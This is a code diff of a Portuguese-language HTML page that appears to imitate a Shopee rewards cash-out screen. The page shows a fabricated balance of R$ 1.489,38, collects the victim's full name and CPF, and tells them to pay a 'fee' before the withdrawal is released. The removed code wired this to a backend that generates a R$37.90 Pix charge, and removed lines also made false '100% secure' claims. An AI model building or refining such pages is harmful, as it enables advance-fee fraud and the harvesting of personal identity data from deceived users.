@@ -3,295 +3,246 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Resgate Disponível</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
+    <title>Resgatar Recompensas</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
     <style>
         /* --- RESET E BASICO --- */
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
         body { 
             font-family: 'Roboto', sans-serif; 
-            background: #f0f2f5; 
+            background: #eef1f6; /* Fundo cinza claro */
             margin: 0; 
-            padding: 0; 
+            padding: 20px; 
             color: #333; 
-            overflow-x: hidden;
         }
-        
-        /* --- CABEÇALHO LARANJA (AJUSTADO) --- */
-        .header-section { 
-            background: linear-gradient(180deg, #ee4d2d 0%, #ff6b4b 100%);
-            padding: 60px 25px 40px 25px; /* Mais espaço no topo */
-            color: white; 
-            border-bottom-left-radius: 30px; 
-            border-bottom-right-radius: 30px; 
-            box-shadow: 0 10px 30px rgba(238, 77, 45, 0.25); 
-            position: relative;
-            z-index: 10;
-        }
-        .header-top { display: flex; justify-content: space-between; align-items: flex-start; }
-        .label-saldo { font-size: 14px; font-weight: 500; opacity: 0.95; letter-spacing: 0.5px; text-transform: uppercase; }
-        .valor-grande { font-size: 48px; font-weight: 900; margin-top: 5px; letter-spacing: -1px; }
-        .pontos-text { font-size: 13px; font-weight: 400; opacity: 0.8; margin-top: -5px; }
-        
-        /* ÍCONE MOEDA ANIMADO */
-        .coin-wrapper { 
-            width: 55px; height: 55px; 
-            background: rgba(255,255,255,0.2); 
-            border-radius: 50%; 
-            display: flex; align-items: center; justify-content: center;
-            backdrop-filter: blur(5px);
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-        }
-        
-        /* --- CARDS (INTERFACE) --- */
-        .main-container { padding: 0 20px; margin-top: -30px; position: relative; z-index: 20; padding-bottom: 40px; }
-        
-        .card-white { 
-            background: white; 
-            border-radius: 16px; 
-            padding: 25px; 
-            box-shadow: 0 8px 25px rgba(0,0,0,0.04); 
-            margin-bottom: 20px; 
+        h1, h3, p { margin: 0; }
+
+        /* --- TÍTULO PRINCIPAL --- */
+        .main-title {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 900;
+            margin-bottom: 20px;
+            color: #000;
         }
 
-        h3.card-title { margin: 0 0 20px 0; font-size: 16px; font-weight: 800; color: #333; display: flex; align-items: center; gap: 8px; }
+        /* --- PAINEL DE SALDO (LARANJA) --- */
+        .header-section { 
+            background: linear-gradient(135deg, #f15a29 0%, #f78e57 100%);
+            padding: 25px;
+            color: white; 
+            border-radius: 20px;
+            position: relative;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header-content { flex: 1; }
+        .label-saldo { font-size: 16px; font-weight: 500; margin-bottom: 5px; }
+        .valor-grande { font-size: 42px; font-weight: 900; line-height: 1; }
+        .pontos-text { font-size: 14px; margin-top: 5px; opacity: 0.9; }
         
-        /* --- OPÇÕES CLICÁVEIS --- */
-        .options-grid { display: flex; gap: 12px; margin-bottom: 12px; }
+        .coin-icon-large { 
+            width: 80px; height: 80px;
+            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.2));
+        }
+
+        .bonus-bar {
+            background: #e85d30;
+            color: white;
+            text-align: center;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 25px;
+        }
+
+        /* --- CARTÕES BRANCOS --- */
+        .card-white { 
+            background: white; 
+            border-radius: 20px; 
+            padding: 25px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05); 
+            margin-bottom: 20px; 
+        }
+        h3.card-title { font-size: 18px; font-weight: 800; margin-bottom: 20px; color: #000; }
+
+        /* --- OPÇÕES DE SAQUE --- */
+        .transfer-info {
+            display: flex; align-items: center; gap: 8px;
+            font-size: 14px; color: #777; margin-bottom: 20px;
+        }
+        .pix-logo { height: 18px; }
+
+        .options-grid { display: flex; gap: 10px; margin-bottom: 10px; }
         .option-btn { 
             flex: 1; 
             padding: 15px 0; 
-            border: 2px solid #f1f1f1; 
-            background: #f9f9f9; 
+            background: #f1f2f6; 
             border-radius: 12px; 
             text-align: center; 
             font-weight: 700; 
-            color: #777; 
+            color: #333;
+            font-size: 16px;
+            border: 2px solid transparent;
             cursor: pointer; 
-            transition: all 0.2s ease; 
         }
         
         .big-option { 
             width: 100%; 
-            padding: 22px 0; 
-            border: 2px solid #f1f1f1; 
-            background: #f9f9f9; 
+            padding: 15px 0; 
+            background: #f1f2f6;
             border-radius: 12px; 
             text-align: center; 
+            font-weight: 900;
+            font-size: 24px;
+            color: #333;
+            border: 2px solid transparent;
             cursor: pointer; 
-            transition: all 0.2s ease; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center;
+            margin-bottom: 20px;
         }
-        .big-option span:first-child { font-size: 24px; font-weight: 900; color: #333; }
-        .big-option span:last-child { font-size: 11px; color: #2ecc71; font-weight: 700; margin-top: 4px; background: rgba(46, 204, 113, 0.1); padding: 4px 10px; border-radius: 20px; }
 
-        /* ESTADO SELECIONADO (O SEGREDO DO CLIQUE) */
+        /* ESTADO SELECIONADO */
         .selected { 
-            border-color: #ee4d2d !important; 
-            background: #fff5f3 !important; 
-            color: #ee4d2d !important; 
-            box-shadow: 0 4px 15px rgba(238, 77, 45, 0.15);
-            transform: translateY(-2px);
+            border-color: #2ecc71 !important; /* Verde Pix */
+            background: #e8f8f0 !important;
+            color: #2ecc71 !important;
         }
-        .big-option.selected span:first-child { color: #ee4d2d !important; }
 
-        /* --- BOTÃO PRINCIPAL --- */
+        /* --- BOTÃO SACAR --- */
         .btn-sacar { 
             width: 100%; 
             background: #e0e0e0; 
-            color: #999; 
-            border: none; 
-            padding: 18px; 
-            border-radius: 12px; 
-            font-size: 16px; 
-            font-weight: 800; 
-            margin-top: 25px; 
-            cursor: not-allowed; 
-            transition: 0.3s; 
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .btn-sacar.active { 
-            background: #ee4d2d; 
             color: white; 
-            cursor: pointer; 
-            box-shadow: 0 8px 20px rgba(238, 77, 45, 0.3); 
-        }
-        .btn-sacar.active:active { transform: scale(0.98); }
-
-        /* --- SACOLA PROFISSIONAL --- */
-        .bag-section { display: flex; align-items: center; justify-content: space-between; }
-        .bag-info h4 { margin: 0; font-size: 15px; font-weight: 800; color: #333; }
-        .bag-info p { margin: 4px 0 0 0; font-size: 12px; color: #888; }
-        .bag-icon { 
-            width: 50px; height: 50px; 
-            background: #fef0ed; 
-            border-radius: 12px; 
-            display: flex; align-items: center; justify-content: center; 
-        }
-
-        /* --- RODAPÉ DE SEGURANÇA (NOVO) --- */
-        .security-footer {
-            margin-top: 10px;
-            padding: 20px;
+            border: none; 
+            padding: 16px; 
+            border-radius: 30px; 
+            font-size: 16px; 
+            font-weight: 700; 
+            cursor: not-allowed; 
             text-align: center;
         }
-        .security-badges { display: flex; justify-content: center; gap: 15px; margin-bottom: 15px; opacity: 0.6; }
-        .badge-img { height: 25px; } /* Ajuste conforme imagem */
-        .security-text { font-size: 11px; color: #999; line-height: 1.5; }
-        .lock-row { display: flex; align-items: center; justify-content: center; gap: 6px; color: #27ae60; font-weight: 700; font-size: 12px; margin-bottom: 10px; }
+        .btn-sacar.active { 
+            background: #2ecc71; /* Verde Pix */
+            cursor: pointer; 
+        }
+        .legal-text { font-size: 11px; color: #999; text-align: center; margin-top: 15px; line-height: 1.4; }
 
-        /* --- MODAIS E UTILITARIOS --- */
+        /* --- CARTÃO DE ACESSO EXCLUSIVO --- */
+        .access-card { display: flex; justify-content: space-between; align-items: flex-start; }
+        .access-content { flex: 1; padding-right: 20px; }
+        .access-text { font-size: 12px; color: #666; line-height: 1.4; margin-top: 10px; }
+        .shopee-bag { width: 70px; height: auto; }
+
+        /* --- MODAIS (Mantidos do anterior) --- */
         .hidden { display: none !important; }
-        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 100; display: flex; align-items: flex-end; backdrop-filter: blur(3px); }
-        .modal-sheet { background: white; width: 100%; border-radius: 25px 25px 0 0; padding: 35px 25px; animation: slideUp 0.3s ease; }
-        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-        
-        input, select { width: 100%; padding: 16px; border: 1px solid #eee; background: #f9f9f9; border-radius: 10px; font-size: 16px; margin-top: 8px; margin-bottom: 15px; outline: none; transition: 0.2s; }
-        input:focus { border-color: #ee4d2d; background: white; }
+        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 100; display: flex; align-items: flex-end; }
+        .modal-sheet { background: white; width: 100%; border-radius: 25px 25px 0 0; padding: 35px 25px; }
+        input { width: 100%; padding: 16px; border: 1px solid #eee; background: #f9f9f9; border-radius: 10px; font-size: 16px; margin-top: 8px; margin-bottom: 15px; outline: none; }
         label { font-size: 13px; font-weight: 700; color: #555; }
     </style>
 </head>
 <body>
 
+    <h1 class="main-title">Resgatar recompensas</h1>
+
     <div class="header-section">
-        <div class="header-top">
-            <div>
-                <div class="label-saldo">Saldo Disponível</div>
-                <div class="valor-grande">R$ <span id="counter">0,00</span></div> 
-                <div class="pontos-text">= <span id="points-counter">0</span> pontos acumulados</div>
-            </div>
-            <div class="coin-wrapper">
-                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="1" x2="12" y2="23"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg>
-            </div>
+        <div class="header-content">
+            <div class="label-saldo">Seu saldo</div>
+            <div class="valor-grande">R$ <span id="counter">1.489,38</span></div> 
+            <div class="pontos-text">= 42.583,05 pontos (s)</div>
         </div>
-        <div style="margin-top: 20px; font-size: 12px; opacity: 0.8; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.2);">
-            Última atualização: <strong>Agora mesmo</strong>
-        </div>
+        <svg class="coin-icon-large" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="12" cy="12" r="10" fill="#FFC107" stroke="#FF9800" stroke-width="1.5"/>
+            <path d="M12 7V17M9 10H15M9 14H15" stroke="#F57F17" stroke-width="2" stroke-linecap="round"/>
+            <text x="50%" y="50%" text-anchor="middle" dy=".3em" font-size="14" font-weight="bold" fill="#F57F17">$</text>
+        </svg>
     </div>
 
-    <div class="main-container">
+    <div class="bonus-bar">
+        Última bonificação apresentada: R$ 845,24
+    </div>
+
+    <div class="card-white">
+        <h3 class="card-title">Sacar dinheiro</h3>
         
-        <div class="card-white">
-            <h3 class="card-title">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#27ae60" stroke-width="2.5"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
-                Selecionar valor do saque
-            </h3>
-
-            <div class="options-grid">
-                <div class="option-btn" onclick="selectItem(this, 1.5)">R$ 1,50</div>
-                <div class="option-btn" onclick="selectItem(this, 5.0)">R$ 5,00</div>
-                <div class="option-btn" onclick="selectItem(this, 10.0)">R$ 10,00</div>
-            </div>
-
-            <div id="big-opt" class="big-option" onclick="selectItem(this, 1489.38)">
-                <span>R$ 1.489,38</span>
-                <span>SALDO TOTAL</span>
-            </div>
-
-            <button id="btn-action" class="btn-sacar" onclick="openModal()">SACAR AGORA</button>
-            
-            <p style="font-size: 11px; text-align: center; color: #aaa; margin-top: 15px;">
-                Taxa de transferência segura calculada no próximo passo.
-            </p>
+        <div class="transfer-info">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
+            Transferência via / 
+            <svg class="pix-logo" viewBox="0 0 62 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M13.576 11.8495L6.82222 5.07239C6.67854 4.9285 6.44544 4.9285 6.30176 5.07239L4.50732 6.8707C4.36364 7.01459 4.36364 7.24849 4.50732 7.39238L11.2611 14.1695C11.4048 14.3134 11.6379 14.3134 11.7816 14.1695L13.576 12.3712C13.7197 12.2273 13.7197 11.9934 13.576 11.8495Z" fill="#32BCAD"/>
+                <path d="M16.0046 7.45022L17.9563 5.49262C18.1002 5.34828 18.3338 5.34828 18.4776 5.49262L25.2552 12.2909C25.3991 12.4353 25.3991 12.6695 25.2552 12.8139L23.3035 14.7715C23.1596 14.9158 22.926 14.9158 22.7822 14.7715L16.0046 7.97316C15.8607 7.82882 15.8607 7.59456 16.0046 7.45022Z" fill="#32BCAD"/>
+                <path d="M16.0325 12.3137L22.7863 19.0908C22.93 19.2347 23.1631 19.2347 23.3068 19.0908L25.1012 17.2925C25.2449 17.1486 25.2449 16.9147 25.1012 16.7708L18.3474 9.99367C18.2037 9.84978 17.9706 9.84978 17.8269 9.99367L16.0325 11.792C15.8888 11.9359 15.8888 12.1698 16.0325 12.3137Z" fill="#32BCAD"/>
+                <path d="M13.5482 16.7129L11.5965 18.6705C11.4526 18.8149 11.2191 18.8149 11.0752 18.6705L4.29763 11.8723C4.15379 11.7279 4.15379 11.4937 4.29763 11.3493L6.24931 9.39171C6.39315 9.24737 6.62677 9.24737 6.77061 9.39171L13.5482 16.19C13.692 16.3344 13.692 16.5686 13.5482 16.7129Z" fill="#32BCAD"/>
+                <path d="M11.5317 7.66533L8.63846 4.76339C8.11698 4.24034 7.27334 4.24034 6.75187 4.76339L1.64626 9.88425C1.12479 10.4073 1.12479 11.2534 1.64626 11.7764L4.53948 14.6784L11.5317 7.66533Z" fill="#32BCAD"/>
+                <path d="M18.0513 16.4979L20.9445 19.3998C21.466 19.9229 22.3096 19.9229 22.8311 19.3998L27.9367 14.279C28.4582 13.7559 28.4582 12.9098 27.9367 12.3868L25.0434 9.48481L18.0513 16.4979Z" fill="#32BCAD"/>
+                <path d="M17.9953 9.42741L20.8885 6.52547C21.41 6.00242 22.2536 6.00242 22.7751 6.52547L27.8807 11.6463C28.4022 12.1694 28.4022 13.0155 27.8807 13.5385L24.9875 16.4405L17.9953 9.42741Z" fill="#32BCAD"/>
+                <path d="M11.5877 14.7358L8.69449 17.6377C8.17301 18.1608 7.32938 18.1608 6.8079 17.6377L1.7023 12.5168C1.18082 11.9938 1.18082 11.1477 1.7023 10.6246L4.59552 7.7227L11.5877 14.7358Z" fill="#32BCAD"/>
+            </svg>
         </div>
 
-        <div class="card-white">
-            <div class="bag-section">
-                <div class="bag-info">
-                    <h4>Clube de Vantagens</h4>
-                    <p>Você tem 3 recompensas pendentes.</p>
-                </div>
-                <div class="bag-icon">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ee4d2d" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"></path><line x1="3" y1="6" x2="21" y2="6"></line><path d="M16 10a4 4 0 0 1-8 0"></path></svg>
-                </div>
-            </div>
+        <div class="options-grid">
+            <div class="option-btn" onclick="selectItem(this, 1.5)">R$ 1,5</div>
+            <div class="option-btn" onclick="selectItem(this, 5.0)">R$ 5</div>
+            <div class="option-btn" onclick="selectItem(this, 10.0)">R$ 10</div>
         </div>
 
-        <div class="security-footer">
-            <div class="lock-row">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
-                Ambiente 100% Seguro
-            </div>
-            <div class="security-text">
-                Este site utiliza tecnologia de criptografia de ponta a ponta (SSL) para garantir a segurança dos seus dados. Pagamentos processados oficialmente.
-                <br><br>
-                © 2026 Resgate Oficial. Todos os direitos reservados.
-            </div>
+        <div id="big-opt" class="big-option" onclick="selectItem(this, 1489.38)">
+            R$ 1.489,38
         </div>
 
+        <button id="btn-action" class="btn-sacar" onclick="openModal()">Sacar dinheiro</button>
+        
+        <p class="legal-text">
+            Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.
+        </p>
+    </div>
+
+    <div class="card-white">
+        <div class="access-card">
+            <div class="access-content">
+                <h3 class="card-title">Obtenha seu acesso exclusivo</h3>
+                <p class="access-text">Descubra todos os benefícios liberados especialmente para você. Ao concluir o acesso, você poderá aproveitar as vantagens disponíveis de forma rápida, segura e sem complicações. Não perca a oportunidade de garantir algo que é limitado e pensado para quem chegou até aqui.</p>
+            </div>
+            <svg class="shopee-bag" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M15 25H65V70C65 72.7614 62.7614 75 60 75H20C17.2386 75 15 72.7614 15 70V25Z" fill="#F15A29"/>
+                <path d="M25 25V15C25 12.2386 27.2386 10 30 10H50C52.7614 10 55 12.2386 55 15V25" stroke="#F15A29" stroke-width="5" stroke-linecap="round"/>
+                <path d="M30 40C30 45.5228 34.4772 50 40 50C45.5228 50 50 45.5228 50 40" stroke="white" stroke-width="4" stroke-linecap="round"/>
+            </svg>
+        </div>
     </div>
 
     <div id="modal-dados" class="modal-overlay hidden">
         <div class="modal-sheet">
-            <h2 style="text-align: center; margin-bottom: 25px; font-size: 20px;">Para onde enviamos?</h2>
-            
-            <label>Nome do Titular</label>
-            <input type="text" id="input-nome" placeholder="Digite seu nome completo">
-
+            <h2 style="text-align: center; margin-bottom: 25px; font-size: 18px;">Confirmar Saque</h2>
+            <label>Nome Completo</label>
+            <input type="text" id="input-nome" placeholder="Nome do titular">
             <label>Chave Pix (CPF)</label>
             <input type="tel" id="input-cpf" placeholder="000.000.000-00" maxlength="14" oninput="maskCPF(this)">
-
-            <button class="btn-sacar active" style="margin-top: 10px;" onclick="goToCheckout()">CONFIRMAR SAQUE</button>
+            <button class="btn-sacar active" style="border-radius: 30px; margin-top: 10px;" onclick="goToCheckout()">CONTINUAR</button>
         </div>
     </div>
 
     <script>
-        // CONFIGURAÇÃO DO RENDER (Importante!)
-        // Se estiver rodando no Render, pode deixar vazio que ele se acha.
-        const API_BASE = ""; 
-
-        // --- 1. ANIMAÇÃO DE CONTAR DINHEIRO ---
-        function animateValue(id, start, end, duration) {
-            const obj = document.getElementById(id);
-            let startTimestamp = null;
-            const step = (timestamp) => {
-                if (!startTimestamp) startTimestamp = timestamp;
-                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
-                
-                // Matematica para contar
-                let currentVal = progress * (end - start) + start;
-                
-                // Formata Brasil
-                obj.innerHTML = currentVal.toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
-                
-                if (progress < 1) {
-                    window.requestAnimationFrame(step);
-                } else {
-                    obj.innerHTML = end.toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
-                }
-            };
-            window.requestAnimationFrame(step);
-        }
-
-        // --- 2. LÓGICA DE SELEÇÃO (BOTOES CLICAVEIS) ---
+        // --- LÓGICA DE SELEÇÃO (MANTIDA) ---
         let valorSelecionado = 0;
 
         function selectItem(element, valor) {
-            // Remove a classe 'selected' de todos
-            document.querySelectorAll('.option-btn, .big-option').forEach(el => {
-                el.classList.remove('selected');
-            });
-
-            // Adiciona no clicado
+            document.querySelectorAll('.option-btn, .big-option').forEach(el => el.classList.remove('selected'));
             element.classList.add('selected');
             valorSelecionado = valor;
-
-            // Ativa o botão de sacar
             const btn = document.getElementById('btn-action');
             btn.classList.add('active');
-            btn.innerText = "SACAR R$ " + valor.toLocaleString('pt-BR', {minimumFractionDigits: 2});
         }
 
         function openModal() {
-            if (valorSelecionado === 0) return alert("Selecione um valor primeiro!");
+            if (valorSelecionado === 0) return;
             document.getElementById('modal-dados').classList.remove('hidden');
         }
 
-        // --- 3. MÁSCARA CPF ---
+        // --- MÁSCARA CPF ---
         function maskCPF(i) {
             let v = i.value.replace(/\D/g, "");
             v = v.replace(/(\d{3})(\d)/, "$1.$2");
@@ -300,65 +251,14 @@
             i.value = v;
         }
 
-        // --- 4. REDIRECIONAR PARA CHECKOUT (INTEGRAÇÃO PIX) ---
-        async function goToCheckout() {
+        // --- FUNÇÃO DE CHECKOUT (Simulação) ---
+        function goToCheckout() {
             const nome = document.getElementById('input-nome').value;
             const cpf = document.getElementById('input-cpf').value.replace(/\D/g, '');
-
-            if (nome.length < 3 || cpf.length < 11) {
-                return alert("Preencha nome e CPF corretamente.");
-            }
-
-            const btn = document.querySelector('#modal-dados button');
-            btn.innerText = "PROCESSANDO...";
-            btn.disabled = true;
-
-            try {
-                // Aqui chamamos o seu backend do Render
-                const response = await fetch(`${API_BASE}/pix`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        amount: 37.90, // Taxa fixa ou dinâmica
-                        name: nome,
-                        cpf: cpf,
-                        email: "cliente@email.com"
-                    })
-                });
-
-                const data = await response.json();
-
-                if (response.ok && data.point_of_interaction) {
-                    // SUCESSO! Mostra o QR Code ou redireciona
-                    // Como você quer o checkout, vou simular o sucesso aqui
-                    // Você pode redirecionar para uma pagina de "Obrigado" ou mostrar o QR Code num modal
-                    
-                    // Exemplo: Mostrando QR Code num alert (ou crie um modal novo)
-                    const codigoPix = data.point_of_interaction.transaction_data.qr_code;
-                    
-                    // Copia automatico
-                    navigator.clipboard.writeText(codigoPix);
-                    alert("✅ PIX GERADO COM SUCESSO!\n\nCódigo Copiado. Cole no seu banco para pagar a taxa e liberar o saque.");
-                    window.location.href = data.point_of_interaction.transaction_data.ticket_url; // Vai para o link do MP se quiser
-                } else {
-                    alert("Erro: " + (data.message || "Falha ao gerar Pix"));
-                }
-
-            } catch (error) {
-                alert("Erro de conexão. Verifique se o Render está rodando.");
-            } finally {
-                btn.innerText = "CONFIRMAR SAQUE";
-                btn.disabled = false;
-            }
+            if (nome.length < 3 || cpf.length < 11) return alert("Preencha corretamente.");
+            alert("Redirecionando para o pagamento da taxa...");
+            // Aqui você colocaria a lógica real de integração com seu backend
         }
-
-        // --- INICIAR ANIMAÇÕES ---
-        window.onload = function() {
-            // Conta de 0 até 1.489,38 em 2 segundos
-            animateValue("counter", 0, 1489.38, 1500);
-            animateValue("points-counter", 0, 42583, 1500);
-        };
-
     </script>
 </body>
 </html>
